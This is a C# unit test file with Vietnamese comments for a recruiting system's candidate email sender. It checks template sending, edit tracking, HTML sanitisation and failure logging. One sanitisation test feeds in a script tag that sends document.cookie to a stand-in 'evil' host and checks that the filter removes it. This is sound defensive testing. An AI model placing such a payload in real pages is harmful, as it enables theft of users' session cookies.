using System;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using ARI.Application.Emails;
using ARI.Application.UnitTests.TestSupport;
using ARI.Domain.Entities;
using Xunit;

namespace ARI.Application.UnitTests.Emails;

/// <summary>
/// Lối đi DUY NHẤT để thư rời hệ thống tới ứng viên (ADR-061, Phase 4): lọc HTML + ghi
/// <see cref="EmailLog"/> + gửi, trong một chỗ — nên "gửi mà không có dấu vết" không còn là
/// trạng thái có thể xảy ra do quên.
/// </summary>
public class CandidateEmailSenderTests
{
    private static readonly RenderedEmail Template =
        new("Thư mời phỏng vấn", "<p>Nội dung từ mẫu</p>", "cand@example.io", "Nguyen Van A");

    private static Task<CandidateEmailSender.SendResult> Send(
        InMemoryUnitOfWork uow, RecordingNotificationService notif, EmailOverride? over, Guid? actor = null)
        => CandidateEmailSender.SendAsync(
            uow, notif, EmailTemplateKeys.InterviewInvite, Template, over,
            applicationId: Guid.NewGuid(), jobPostingId: Guid.NewGuid(),
            sentByUserId: actor, ct: CancellationToken.None);

    [Fact]
    public async Task Khong_sua_gi_thi_gui_dung_mau()
    {
        var uow = new InMemoryUnitOfWork();
        var notif = new RecordingNotificationService();

        var res = await Send(uow, notif, over: null);

        Assert.True(res.Sent);
        var sent = Assert.Single(notif.Emails);
        Assert.Equal("Thư mời phỏng vấn", sent.Subject);
        Assert.Contains("Nội dung từ mẫu", sent.Body);

        var log = Assert.Single(uow.Repo<EmailLog>().Items);
        Assert.False(log.WasEdited); // cột này là câu trả lời cho "thư này ai viết"
        Assert.Equal("sent", log.Status);
    }

    [Fact]
    public async Task Sua_tay_thi_gui_ban_sua_va_danh_dau_was_edited()
    {
        var uow = new InMemoryUnitOfWork();
        var notif = new RecordingNotificationService();
        var over = new EmailOverride
        {
            Subject = "Mời bạn tới phỏng vấn vòng 1",
            BodyHtml = "<p>Anh/chị nhớ mang theo CCCD nhé.</p>",
        };

        var res = await Send(uow, notif, over);

        Assert.True(res.Sent);
        var sent = Assert.Single(notif.Emails);
        Assert.Equal("Mời bạn tới phỏng vấn vòng 1", sent.Subject);
        Assert.Contains("CCCD", sent.Body);
        Assert.True(Assert.Single(uow.Repo<EmailLog>().Items).WasEdited);
    }

    [Fact]
    public async Task Ban_sua_tay_di_qua_bo_loc_truoc_khi_gui()
    {
        var uow = new InMemoryUnitOfWork();
        var notif = new RecordingNotificationService();
        var over = new EmailOverride
        {
            Subject = "Mời phỏng vấn",
            BodyHtml = "<p>Xin chào</p><script>fetch('http://evil?c='+document.cookie)</script>",
        };

        await Send(uow, notif, over);

        var sent = Assert.Single(notif.Emails);
        Assert.DoesNotContain("script", sent.Body, StringComparison.OrdinalIgnoreCase);

        // Nhật ký lưu bản ĐÃ LỌC — đúng bằng thứ được gửi, không phải bản người dùng gõ vào.
        var log = Assert.Single(uow.Repo<EmailLog>().Items);
        Assert.DoesNotContain("script", log.BodyHtml, StringComparison.OrdinalIgnoreCase);
        Assert.Equal(sent.Body, log.BodyHtml);
    }

    [Fact]
    public async Task Ban_sua_rong_thi_roi_ve_mau_thay_vi_gui_thu_trong()
    {
        var uow = new InMemoryUnitOfWork();
        var notif = new RecordingNotificationService();

        await Send(uow, notif, new EmailOverride { Subject = "   ", BodyHtml = "   " });

        var sent = Assert.Single(notif.Emails);
        Assert.Equal("Thư mời phỏng vấn", sent.Subject);
        Assert.Contains("Nội dung từ mẫu", sent.Body);
    }

    [Fact]
    public async Task Ghi_lai_nguoi_bam_gui()
    {
        var uow = new InMemoryUnitOfWork();
        var actor = Guid.NewGuid();

        await Send(uow, new RecordingNotificationService(), over: null, actor: actor);

        Assert.Equal(actor, Assert.Single(uow.Repo<EmailLog>().Items).SentByUserId);
    }

    [Fact]
    public async Task Smtp_hong_thi_ghi_that_bai_chu_khong_nem_loi()
    {
        // Gửi thư là best-effort ở toàn hệ thống: SMTP hỏng không được phép làm hỏng việc chốt
        // chỗ hay đổi trạng thái hồ sơ. Khác trước là nay có chỗ nhìn thấy nó.
        var uow = new InMemoryUnitOfWork();
        var notif = new ThrowingNotificationService();

        var res = await CandidateEmailSender.SendAsync(
            uow, notif, EmailTemplateKeys.InterviewInvite, Template, null,
            applicationId: Guid.NewGuid(), jobPostingId: null, sentByUserId: null, ct: CancellationToken.None);

        Assert.False(res.Sent);
        var log = Assert.Single(uow.Repo<EmailLog>().Items);
        Assert.Equal("failed", log.Status);
        Assert.False(string.IsNullOrWhiteSpace(log.ErrorMessage));
    }
}

/// <summary>Giả lập SMTP hỏng.</summary>
internal sealed class ThrowingNotificationService : ARI.Application.Interfaces.INotificationService
{
    public Task PublishUserEventAsync(Guid userId, string eventType, object payload, CancellationToken ct = default) => Task.CompletedTask;
    public Task PublishGroupEventAsync(string groupName, string eventType, object payload, CancellationToken ct = default) => Task.CompletedTask;
    public Task PublishAllEventAsync(string eventType, object payload, CancellationToken ct = default) => Task.CompletedTask;
    public Task PublishInterviewSessionEventAsync(Guid sessionId, string eventType, object payload, CancellationToken ct = default) => Task.CompletedTask;
    public Task SendEmailAsync(string toEmail, string subject, string content, CancellationToken ct = default)
        => throw new InvalidOperationException("SMTP unreachable");
    public Task<string?> SendThreadedEmailAsync(string toEmail, string subject, string content, string? inReplyToMessageId = null, CancellationToken ct = default)
        => throw new InvalidOperationException("SMTP unreachable");
    public Task SendSlackNotificationAsync(string message, CancellationToken ct = default) => Task.CompletedTask;
    public Task SendTeamsNotificationAsync(string message, CancellationToken ct = default) => Task.CompletedTask;
}
